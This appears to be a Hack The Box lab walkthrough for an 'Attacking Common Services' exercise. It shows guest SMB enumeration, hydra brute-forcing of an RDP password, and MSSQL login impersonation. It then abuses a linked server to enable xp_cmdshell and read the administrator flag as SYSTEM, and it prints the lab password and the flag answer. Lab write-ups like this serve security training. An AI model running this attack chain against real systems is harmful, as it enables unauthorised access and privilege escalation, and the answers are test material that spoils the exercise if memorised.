Attacking Common Services - Hard

The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.

Question 1
What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)
> smbmap -H 10.129.203.10 -u 'guest' -p ''
[+] IP: 10.129.203.10:445	Name: 10.129.203.10       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Home                                              	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
> smbmap -H 10.129.203.10 -u 'guest' -p '' -r Home
Home                                              	READ ONLY	
	./Home
	dr--r--r--                0 Thu Apr 21 22:18:21 2022	.
	dr--r--r--                0 Thu Apr 21 22:18:21 2022	..
	dr--r--r--                0 Fri Apr 22 04:14:02 2022	HR
	dr--r--r--                0 Thu Apr 21 21:11:44 2022	IT
	dr--r--r--                0 Fri Apr 22 04:14:51 2022	OPS
	dr--r--r--                0 Fri Apr 22 04:15:29 2022	Projects
	IPC$                                              	READ ONLY	Remote IPC
> smbmap -H 10.129.203.10 -u 'guest' -p '' -r Home/IT
Home                                              	READ ONLY	
	./HomeIT
	dr--r--r--                0 Thu Apr 21 21:11:44 2022	.
	dr--r--r--                0 Thu Apr 21 21:11:44 2022	..
	dr--r--r--                0 Thu Apr 21 21:11:53 2022	Fiona
	dr--r--r--                0 Thu Apr 21 22:15:09 2022	John
	dr--r--r--                0 Thu Apr 21 22:16:07 2022	Simon
	IPC$                                              	READ ONLY	Remote IPC
> smbmap -H 10.129.203.10 -u 'guest' -p '' -r Home/IT/Simon
fr--r--r--               94 Thu Apr 21 22:16:48 2022	random.txt
"random.txt"

Question 2
Enumerate the target and find a password for the user Fiona. What is her password?
> hydra -l 'Fiona' -P creds.txt -f rdp://10.129.230.139
[3389][rdp] account on 10.129.230.139 might be valid but account not active for remote desktop: login: Fiona password: 48Ns72!bns74@S84NNNSl, continuing attacking the account.
> xfreerdp3 /u:Fiona /p:'48Ns72!bns74@S84NNNSl' /v:10.129.230.139 /cert:ignore

Question 3
 Once logged in, what other user can we compromise to gain admin privileges?
>xfreerdp3 /u:Fiona /p:'48Ns72!bns74@S84NNNSl' /v:10.129.230.139 /cert:ignore
I copied this to my target machine "C:\Home\IT\John\secrets.txt" 
> cat secrets.txt >> creds.txt 
> mssqlclient.py 'Fiona:48Ns72!bns74@S84NNNSl'@10.129.203.10 -windows-auth
SQL (WIN-HARD\Fiona  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
name    
-----   
john    
simon   
SQL (WIN-HARD\Fiona  guest@master)> EXECUTE AS LOGIN = 'john';
SQL (john  guest@master)> SELECT SYSTEM_USER;
       
----   
john   
SQL (john  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0   
SQL (john  guest@master)> SELECT srvname, isremote FROM sysservers;
srvname                 isremote   
---------------------   --------   
WINSRV02\SQLEXPRESS            1   
LOCAL.TEST.LINKED.SRV          0   
SQL (john  guest@master)> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV];
                
-   -   -   -   
1   1   1   1   

Answer "john"

Question 4
Submit the contents of the flag.txt file on the Administrator Desktop.
SQL (john  guest@master)> EXECUTE('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV];
INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (john  guest@master)> EXECUTE('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
output                
-------------------   
nt authority\system   
NULL                  
SQL (john  guest@master)> EXECUTE('xp_cmdshell ''dir /s /b C:\Users\*flag*.txt''') AT [LOCAL.TEST.LINKED.SRV];
output                                    
---------------------------------------   
C:\Users\Administrator\Desktop\flag.txt   
NULL                                      
SQL (john  guest@master)> EXECUTE('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];
output                        
---------------------------   
HTB{46u$!n9_l!nk3d_$3rv3r$}   
